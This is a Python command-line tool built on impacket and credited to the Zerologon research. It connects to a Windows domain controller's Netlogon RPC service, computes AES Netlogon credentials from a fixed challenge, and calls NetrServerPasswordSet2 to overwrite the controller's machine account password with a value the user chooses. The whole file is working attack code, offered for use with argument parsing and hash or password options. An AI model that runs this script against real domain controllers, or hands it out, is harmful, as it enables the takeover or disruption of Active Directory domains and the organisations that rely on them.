#!/usr/bin/env python
# By @_dirkjan
# Uses impacket by SecureAuth Corp
# Based on work by Tom Tervoort (Secura)

import sys
import logging
import argparse
import codecs

from impacket.examples import logger
from impacket import version
from impacket.dcerpc.v5.nrpc import NetrServerPasswordSet2Response, NetrServerPasswordSet2
from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.dtypes import NULL

from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5 import epm, nrpc
from Cryptodome.Cipher import AES
from binascii import unhexlify
from struct import pack, unpack

class ChangeMachinePassword:
    KNOWN_PROTOCOLS = {
        135: {'bindstr': r'ncacn_ip_tcp:%s',           'set_host': False},
        139: {'bindstr': r'ncacn_np:%s[\PIPE\netlogon]', 'set_host': True},
        445: {'bindstr': r'ncacn_np:%s[\PIPE\netlogon]', 'set_host': True},
        }

    def __init__(self, username='', password='', domain='', port = None,
                 hashes = None, domain_sids = False, maxRid=4000):

        self.__username = username
        self.__password = password
        self.__port = port
        self.__maxRid = int(maxRid)
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__domain_sids = domain_sids
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def dump(self, remoteName, remoteHost):


        stringbinding = epm.hept_map(remoteHost, nrpc.MSRPC_UUID_NRPC, protocol = 'ncacn_ip_tcp')
        logging.info('StringBinding %s'%stringbinding)
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(nrpc.MSRPC_UUID_NRPC)

        resp = nrpc.hNetrServerReqChallenge(dce, NULL, remoteName + '\x00', b'12345678')
        serverChallenge = resp['ServerChallenge']

        ntHash = unhexlify(self.__nthash)

        # Empty at this point
        self.sessionKey = nrpc.ComputeSessionKeyAES('', b'12345678', serverChallenge)

        self.ppp = nrpc.ComputeNetlogonCredentialAES(b'12345678', self.sessionKey)

        try:
            resp = nrpc.hNetrServerAuthenticate3(dce, '\\\\' + remoteName + '\x00', self.__username + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,remoteName + '\x00',self.ppp, 0x212fffff )
        except Exception as e:
            if str(e).find('STATUS_DOWNGRADE_DETECTED') < 0:
                raise
        self.clientStoredCredential = pack('<Q', unpack('<Q',self.ppp)[0] + 10)

        request = NetrServerPasswordSet2()
        request['PrimaryName'] = '\\\\' + remoteName + '\x00'
        request['AccountName'] = remoteName + '$\x00'
        request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
        request['Authenticator'] = self.update_authenticator()
        request['ComputerName'] = remoteName + '\x00'
        encpassword = nrpc.ComputeNetlogonCredentialAES(self.__password, self.sessionKey)
        indata = b'\x00' * (512-len(self.__password)) + self.__password + pack('<L', len(self.__password))
        request['ClearNewPassword'] = nrpc.ComputeNetlogonCredentialAES(indata, self.sessionKey)
        result = dce.request(request)
        print('Change password OK')

    def update_authenticator(self, plus=10):
        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator['Credential'] = nrpc.ComputeNetlogonCredentialAES(self.clientStoredCredential, self.sessionKey)
        authenticator['Timestamp'] = plus
        return authenticator



# Process command-line arguments.
if __name__ == '__main__':
    # Init the example's logger theme
    logger.init()
    # Explicitly changing the stdout encoding format
    if sys.stdout.encoding is None:
        # Output is redirected to a file
        sys.stdout = codecs.getwriter('utf8')(sys.stdout)
    print(version.BANNER)

    parser = argparse.ArgumentParser()

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')

    group = parser.add_argument_group('connection')

    group.add_argument('-target-ip', action='store', metavar="ip address", help='IP Address of the target machine. '
                       'If omitted it will use whatever was specified as target. This is useful when target is the '
                       'NetBIOS name and you cannot resolve it')
    group.add_argument('-port', choices=['135', '139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')
    group.add_argument('-domain-sids', action='store_true', help='Enumerate Domain SIDs (will likely forward requests to the DC)')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hexpass', action="store", help='Hex encoded plaintext password')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful when proxying through smbrelayx)')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    import re

    domain, username, password, remoteName = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
        options.target).groups('')

    #In case the password contains '@'
    if '@' in remoteName:
        password = password + '@' + remoteName.rpartition('@')[0]
        remoteName = remoteName.rpartition('@')[2]

    if domain is None:
        domain = ''

    if password == '' and options.hexpass != '':
        password = unhexlify(options.hexpass)

    if password == '' and username != '' and options.hashes is None and options.no_pass is False:
        from getpass import getpass
        password = getpass("Password:")

    if options.target_ip is None:
        options.target_ip = remoteName

    action = ChangeMachinePassword(username, password, domain, int(options.port), options.hashes, options.domain_sids)
    action.dump(remoteName, options.target_ip)
